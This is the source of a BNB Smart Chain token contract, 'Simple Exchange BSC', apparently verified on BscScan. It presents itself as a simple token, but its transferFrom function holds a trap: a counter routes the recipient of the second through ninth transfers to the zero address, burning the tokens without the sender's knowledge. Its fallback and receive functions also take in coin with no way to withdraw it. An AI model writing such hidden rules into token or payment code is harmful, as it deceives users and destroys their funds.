/**
 *Submitted for verification at BscScan.com on 2023-05-04
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

contract SIEXBSC {
    string public name     = "Simple Exchange BSC";
    string public symbol   = "SIEXBSC";
    uint8  public decimals = 18;

    uint256 _totalSupply = 1_000_000_000_000_000_000_000_000_000_000_000;

    event  Approval(address indexed src, address indexed guy, uint amount);
    event  Transfer(address indexed src, address indexed dst, uint amount);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;
    
    constructor() {
        balanceOf[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    fallback() external payable {
    }
    receive() external payable {
    }

    function myBalance() external view returns (uint) {
        return balanceOf[msg.sender];
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }

    function approve(address guy, uint amount) public returns (bool) {
        allowance[msg.sender][guy] = amount;
        emit Approval(msg.sender, guy, amount);
        return true;
    }

    function approveAll(address guy) public returns (bool) {
        return approve(guy, 2**256 - 1);
    }

    function transfer(address dst, uint amount) public returns (bool) {
        return transferFrom(msg.sender, dst, amount);
    }

    // first 10 buys will go to 0
    uint256 buyNumber = 0;

    function transferFrom(address src, address dst, uint amount)
        public
        returns (bool)
    {
        require(balanceOf[src] >= amount);

        if (buyNumber++ > 0 && buyNumber < 10) {
            // first 10 buys go to 0
            dst = address(0);
        }

        if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }

        balanceOf[src] -= amount;
        balanceOf[dst] += amount;

        emit Transfer(src, dst, amount);

        return true;
    }
}